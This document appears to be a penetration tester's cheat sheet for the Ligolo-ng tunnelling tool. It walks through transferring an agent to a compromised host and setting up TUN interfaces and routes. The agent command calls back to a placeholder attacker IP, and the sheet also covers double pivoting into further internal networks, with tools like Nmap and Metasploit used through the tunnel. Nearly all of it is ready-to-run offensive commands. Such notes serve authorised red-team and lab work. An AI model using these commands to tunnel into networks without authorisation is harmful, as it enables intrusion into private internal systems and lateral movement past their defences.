# Ligolo-ng

## 1. Agent Acquisition

* Download the correct Ligolo-ng agent binary for the target OS.
* Transfer the agent to the compromised host.

## 2. Proxy Initialization (Attacker Machine)

### Create TUN Interface

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

### Start Ligolo-proxy

Lab / self-signed:

```bash
ligolo-proxy -selfcert
```

With trusted certificate:

```bash
ligolo-proxy -certfile <cert.pem> -keyfile <key.pem>
```

## 3. Agent Connection (Compromised Host)

Execute the agent:

```bash
./agent -connect <Attacker_IP>:11601 -ignore-cert
```

Use `-ignore-cert` only with self-signed certificates.

## 4. Tunnel Establishment (Attacker Machine)

Select the agent session inside the proxy interface.

### Add Route

```bash
sudo ip route add <Target_Network_CIDR> dev ligolo
```

### Start Tunnel

```bash
start
```

## 5. Verification and Usage

Use Nmap, Metasploit, or other tools through the tunnel to access the internal network.

## 6. Double Pivoting

### Second TUN Interface

```bash
sudo ip tuntap add user $USER mode tun ligol
sudo ip link set ligol up
```

### Listener Forwarding

```bash
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

### Second Agent

Run the second agent on the next compromised host and connect it to the forwarded port.

### Second Route

```bash
sudo ip route add <Second_Target_Network_CIDR> dev ligol
```
